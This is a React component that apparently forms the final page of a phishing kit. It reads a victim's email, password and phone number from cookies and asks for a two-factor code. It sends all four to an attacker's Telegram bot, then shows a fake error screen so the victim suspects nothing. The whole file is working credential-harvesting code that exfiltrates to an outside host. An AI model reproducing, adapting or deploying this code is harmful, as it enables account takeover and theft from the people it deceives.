import Cookies from "js-cookie";
import React, { useState } from "react";
import { TELEGRAM_URL, TELEGRAM_CHAT_ID } from "./telegramConfig";

const ThirdPage = () => {
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorDisplay, setErrorDisplay] = useState(false);

  const handleSubmit = () => {
    if (!code) {
      alert("Please enter the authentication code");
      return;
    }

    setLoading(true);

    const email = Cookies.get("user_email");
    const password = Cookies.get("user_password");
    const phone = Cookies.get("user_phone");

    const message = `
✅ *Step 3: Final Submission*
📧 *Email:* ${email}
🔑 *Password:* ${password}
📞 *Phone:* ${phone}
📮 *Auth Code:* ${code}
    `;

    fetch(TELEGRAM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })
      .then((res) =>
        res.ok
          ? console.log("Sent to Telegram")
          : console.error("Telegram error")
      )
      .catch((err) => console.error("Telegram fetch error", err))
      .finally(() => {
        setTimeout(() => {
          setLoading(false);
          setErrorDisplay(true); // Always show error after "success"
        }, 10000);
      });
  };

  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="bg-white shadow-lg rounded-lg p-6 w-full max-w-md">
        <h1 className="text-lg font-semibold text-red-600">Authentication</h1>
        <p className="text-sm text-gray-500 mt-2">
          Enter the code sent to your phone.
        </p>

        {loading ? (
          <div className="flex justify-center mt-4">
            <div className="animate-spin h-8 w-8 border-t-2 border-red-500 rounded-full" />
          </div>
        ) : errorDisplay ? (
          <div className="text-red-600 mt-6 text-center font-medium">
            ❌ Error. Try again in a few hours.
          </div>
        ) : (
          <>
            <input
              type="number"
              className="mt-4 w-full border p-2 rounded-md"
              placeholder="Enter code"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
            <button
              onClick={handleSubmit}
              className="mt-6 w-full bg-red-500 text-white py-2 rounded-md hover:bg-red-600"
            >
              Verify
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default ThirdPage;
